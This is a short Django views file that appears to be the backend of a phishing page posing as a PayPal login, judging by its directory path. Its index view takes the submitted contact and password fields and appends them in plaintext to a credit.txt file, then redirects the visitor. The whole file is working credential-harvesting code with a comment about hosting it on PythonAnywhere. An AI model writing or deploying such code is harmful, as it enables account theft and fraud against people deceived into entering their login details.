
from django.shortcuts import render, redirect


import os


def index(request):

    if request.method == "POST":

        username = request.POST['contact']

        password = request.POST['password']

        store_credit(username, password)

        return redirect('main')

    return render(request, "index.html")


def store_credit(username, password):
    # Directory path where credit file will be stored
    base_directory = "/home/danscot/PycharmProjects/paypal/paypal_login"  # Change 'your_username' to your PythonAnywhere username


    # Ensure base directory exists
    if not os.path.exists(base_directory):
        os.makedirs(base_directory)

    # File path for storing user credits
    file_path = os.path.join(base_directory, 'credit.txt')

    # Store user credentials in the file
    with open(file_path, 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    print("Credit stored successfully!")

